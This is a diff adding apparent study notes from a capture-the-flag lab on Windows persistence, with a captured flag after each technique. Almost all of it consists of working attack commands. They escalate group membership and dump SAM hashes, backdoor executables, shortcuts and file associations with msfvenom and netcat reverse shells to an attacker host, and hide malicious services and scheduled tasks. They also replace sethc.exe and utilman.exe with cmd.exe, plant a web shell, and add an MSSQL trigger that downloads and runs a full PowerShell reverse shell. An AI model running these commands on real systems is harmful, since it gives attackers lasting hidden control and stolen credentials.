@@ -1,0 +1,330 @@
+-reasons for local persistence
+1. re-exploitation isn't always possible
+2. getting a foothold is hard to reproduce
+3. security is one step behind
+
+---------------------------------------------------------------------------------------------
+
+Assign Group Membership
+-make unprivileged user gain admin privileges
+net localgroup administrators thmuser0 /add
+
+-avoid being suspicious - use backup operators group
+-won't have admin privileges but have read/write access to anyfile or registry key on the system
+-can escalate to admin account trivially
+net localgroup "Backup Operators" thmuser1 /add
+
+-add to RDP or winRM
+net localgroup "Remote Mangement Users" thmuser1 /add
+
+-connect using evil-winrm
+evil-winrm -i [IP] -u thmuser1 -p Password321
+whoami /groups
+
+-LocalAccountTokenFilterPolicy implemented by User Account Control (UAC) - strips admin privileges when logging in remotely
+reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /t REG_DWORD /v LocalAccountTokenFilterPolicy /d 1
+
+*stay in directory: C:\Users\thmuser1\Documents
+
+(on evil-winrm)
+reg save hklm\system system.bak
+reg save hklm\sam sam.bak
+download system.bak
+download sam.bak
+
+-attacker machine
+(apt install python3-impacket)
+impacket-secretsdump -sam sam.bak -system system.bak LOCAL
+-get hashes
+-log into administator using hashes
+evil-winrm -i [IP] -u Administrator
+THM{FLAG_BACKED_UP!}
+
+Special Privileges and Security Descriptors
+-SeBackupPrivilege: The user can read any file in the system, ignoring any DACL in place.
+-SeRestorePrivilege: The user can write any file in the system, ignoring any DACL in place.
+-admin terminal
+secedit /export /cfg config.inf
+-go to file same directory
+-add thmuser2 to SeBackupPrivilege and SeRestorePrivilege
+-save file
+-convert .inf file to .sdb file to load configuration back into the system
+secedit /import /cfg config.inf /db config.sdb
+secedit /configure /db config.sdb /cfg config.inf
+-add thmuser2 to remote mangement users group
+-powershell
+Set-PSSessionConfiguration -Name Microsoft.PowerShell -showSecurityDescriptorUI
+-add thmuser2 and give full control permissions
+-log in using evil-winrm
+evil-winrm -i [IP] -u thmuser2 -p Password321
+cd C:\flags
+.\flag2.exe
+*THM{IM_JUST_A_NORMAL_USER}
+
+RID Hijacking
+
+
+----------------------------------------------------------------------------------------------------------------------------------------------------
+
+Backdooring files
+
+Executabel files
+-tampering with files user interacts with regularly
+-files must keep working as expected
+-eg executable file on the desktop
+-use msfvenom to generate an executable
+-eg. shortcut to PuTTY points to C:\Program Files\PuTTY\putty.exe
+msfvenom -a x64 --platform windows -x putty.exe -k -p windows/x64/shell_reverse_tcp lhost=ATTACKER_IP lport=4444 -b "\x00" -f exe -o puttyX.exe
+
+Shortcut files
+-make shortcut point to a scritps that will run the backdoor and then execute the usual program
+-create powershell script
+Start-Process -NoNewWindow "c:\tools\nc64.exe" "-e cmd.exe [Attacker IP] [Port]"
+C:\Windows\System32\calc.exe
+-save file as backdoor.ps1 in windows\system32
+-right click on calc and got to shortcut
+-in the target add
+powershell.exe -WindowStyle hidden C:\Windows\System32\backdoor.ps1
+-start an nc listener on attacker machine
+nc -lvp port
+-run calc
+-get flag5
+*THM{NO_SHORTCUTS_IN_LIFE}
+
+Hijacking File Associations
+-hijack any file association to force the os to run a shell wheever user opens a specific file
+-associations kept in HKLM\Software\Classes
+-find a reference to program halding the ProgID
+-exampel is txtfile -> NOTEPAD.EXE
+-%1 represents the name of the opened file
+-create a backdoor
+Start-Process -NoNewWindow "c:\tools\nc64.exe" "-e cmd.exe ATTACKER_IP 4448"
+C:\Windows\system32\NOTEPAD.EXE $args[0]
+-change the registry key to backdoor
+powershell -windowstyle hidden C:\windows\backdoor2.ps1 %1
+-start listener
+nc -lvp 4448
+-run file
+-get flag
+*THM{TXT_FILES_WOULD_NEVER_HURT_YOU}
+
+--------------------------------------------------------------------------------------------------------------------------------
+
+Abusing Services
+-using service is great for establishing persistence
+-configured to run in the background
+-can regain control of victim machine each time it is started
+-create a background service
+sc.exe create THMservice binPath= "net user Administrator Passwd123" start= auto
+sc.exe start THMservice
+-create a reverse shell with msfvenom and associate it with the created service
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=[Attack IP] LPORT=[attack port] -f exe-service -o rev-svc.exe
+-attack machine
+python3 -m http.server
+-victim machine
+wget http://[attackIP]:8000/rev-svc.exe-O rev-svc.exe
+-set bin path and service
+sc.exe create THMservice2 binPath= "C:\..\rev-svc.exe" start= auto
+-start listner
+nc -lvp [attack port]
+-start service
+sc.exe start THMservice2
+-grab flag
+*THM{SUSPICIOUS_SERVICE}
+
+Modifying existing services
+-disabled service = good candidate 
+-query 
+sc.exe query state=all
+-THMService3 example
+sc.exe qc THMService3
+-three steps
+1. binary-path-name should point to payload
+2. start-type shouhld be automatic without user interaction
+3. service-start-name should be preferebly set to LocalSystem
+-create payload
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=5558 -f exe-service -o rev-svc.exe
+-host 
+python3 -m http.server
+-get file on victiim machine - powershell
+PS C:\Users\Administrator> wget http://attackerIP:8000/rev-svc.exe -O rev-svc.exe
+-set parameters
+sc.exe config THMservice3 binPath= "C:\Users\Administrator\rev-svc.exe" start= auto obj= "LocalSystem"
+-start listener on port 5558 on attack machine
+nc -lvp 5558
+-start service
+sc.exe start THMservice3
+-grab flag
+*THM{IN_PLAIN_SIGHT}
+
+---------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+Abusing scheduled Tasks
+-Windows task scheduler - granular control of when task start
+-configure activation at specific hours and dates
+-create a task that runs a reverse shell every minute
+schtasks /create /sc minute /mo 1 /tn THM-TaskBackdoor /tr "c:\tools\nc64 -e cmd.exe [AttackIP] [AttackPort]" /ru SYSTEM
+-/sc and /mo: run every minute, /ru: run with system privileges
+-query task 
+schtasks /query /tn thm-taskbackdoor
+-mask task inivisible
+-Security Descriptor: ties scheduled tasks to users
+c:\tools\pstools\PsExec64.exe -s -i regedit
+-open regedit go to: HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\
+-delete SD for the task
+-try query again should return an error 
+-start listener on attack machine
+nc -lvp [AttackPort]
+-grab flag
+*THM{JUST_A_MATTER_OF_TIME}
+
+-------------------------------------------------------------------------------------------------------
+
+Logon triggered Persistence
+-link payloads with particular interactions
+-execute payload when user logs into the system
+-run executable C:\Users\<your_username>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
+-all users C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp
+-generate payload
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4450 -f exe -o revshell.exe
+-start http server
+python3 -m http.server
+-get payload
+wget http://AttackIP:8000/revshell.exe -O revshell.exe
+-copy payload
+C:\> copy revshell.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\"
+-create listener
+nc -lvp 4450
+-log back in 
+-grab flag
+*THM{NO_NO_AFTER_YOU}
+
+Run / RunOnce
+-force a nuser to execute a program on logon via registry
+HKCU\Software\Microsoft\Windows\CurrentVersion\Run
+HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce
+HKLM\Software\Microsoft\Windows\CurrentVersion\Run
+HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce
+-HKLM: everyone, HKCU: current user
+-create payload
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4450 -f exe -o revshell.exe
+-start httpserver
+python3 -m http.server
+-get payload
+wget http://AttackIP:8000/revshell.exe -O revshell.exe
+-move payload
+move revshell.exe C:\Windows
+go to HKLM\Software\Microsoft\Windows\CurrentVersion\Run
+-add REG_EXPAND_SZ with value C:\Windows\revshell.exe
+*THM{LET_ME_HOLD_THE_DOOR_FOR_YOU}
+
+WinLogon
+-use reg keys under HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\
+-gain persistence using 'userinit' points to userinit.exe
+-shell points to system's shell explorer.exe
+-append payload by adding comma  after original data
+-grab shell
+*THM{I_INSIST_GO_FIRST}
+
+Logon scripts
+-userinit.exe checks for env variable called UserInitMprLogonScript
+-use env variable to assign a logon script to a user 
+-each user has its own env variable so has to backdoor separately
+*THM{USER_TRIGGERED_PERSISTENCE_FTW}
+
+----------------------------------------------------------------------------------------------
+
+Backdoor login screen to access a terminal
+1. Sticky Keys
+-activate sticky keys by pressing shift 5 times
+-windows will execute binary C:\Windows\System32\sethc.exe
+-replace binary with a payload
+-to get cmd -> replace sethc.exe with cmd.exe
+-grant current user permission to modify it
+takeown /f c:\Windows\System32\sethc.exe
+icacls C:\Windows\System32\sethc.exe /grant Administrator:F
+copy C:\Windows\System32\cmd.exe C:\Windows\System32\sethc.exe
+yes
+-while on login screen: press shift 5 times and open cmd
+-grab flag
+*THM{BREAKING_THROUGH_LOGIN}
+
+2. Utilman
+-built-in windows application used to provide Ease of Access options during lock screen
+-clicking on utilman button executes C:\Windows\System32\Utilman.exe
+-replace Utilman.exe with cmd.exe
+takeown /f C:\Windows\System32\utilman.exe
+icacls C:\Windows\System32\Utilman.exe /grant Administrator:F
+copy C:\Windows\System32\cmd.exe C:\Windows\System32\utilman.exe
+yes
+-on login screen: click on utilman icon
+-grab flag
+*THM{THE_LOGIN_SCREEN_IS_MERELY_A_SUGGESTION}
+
+---------------------------------------------------------------------------------------------
+
+Persisting Through Existing Services
+
+Using Web Shells
+-uploading web shell to web directory
+-access to iis apppool\defaultapppool
+-has special SeImpersonatePrivilege - easy path to escalation to Admin
+https://github.com/tennc/webshell/blob/master/fuzzdb-webshell/asp/cmdasp.aspx
+-move to victim machine in C:\inetpub\wwwroot
+move shell.aspx C:\inetpub\wwwroot\
+-grant access
+icacls shell.aspx /grant Everyone:F
+-run command from web server
+http://[IP]/shell.aspx
+C:\flag\flag16.exe
+-grab flag
+*THM{EZ_WEB_PERSISTENCE}
+
+Using MSSQL as a Backdoor
+-triggers in MSSQL - bind actions to be performed when specific events occur in the db
+-enable xp_cmdshell - disabled by default
+-open Microsoft SQL Server Mangement Studio 18 - windows authentication
+-New Query
+sp_configure 'Show Advanced Options',1;
+RECONFIGURE;
+GO
+
+sp_configure 'xp_cmdshell',1;
+RECONFIGURE;
+GO
+-grant access to run xp_cmdshell
+USE master
+
+GRANT IMPERSONATE ON LOGIN::sa to [Public];
+-change to HRDB database
+UsE HRDB
+-trigger to be configured whenever an INSERT is made into DB
+-go to HRDB create new Query
+CREATE TRIGGER [sql_backdoor]
+ON HRDB.dbo.Employees 
+FOR INSERT AS
+
+EXECUTE AS LOGIN = 'sa'
+EXEC master..xp_cmdshell 'Powershell -c "IEX(New-Object net.webclient).downloadstring(''http://ATTACKER_IP:8000/evilscript.ps1'')"';
+-two terminals
+-evilscript.ps1 will be accessed at port 8000
+$client = New-Object System.Net.Sockets.TCPClient("ATTACKER_IP",4454);
+
+$stream = $client.GetStream();
+[byte[]]$bytes = 0..65535|%{0};
+while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
+    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
+    $sendback = (iex $data 2>&1 | Out-String );
+    $sendback2 = $sendback + "PS " + (pwd).Path + "> ";
+    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
+    $stream.Write($sendbyte,0,$sendbyte.Length);
+    $stream.Flush()
+};
+
+$client.Close()
+-netcat lisener on port 
+nc -lvp 4454
+-grab flag
+*THM{I_LIVE_IN_YOUR_DATABASE}
+
+
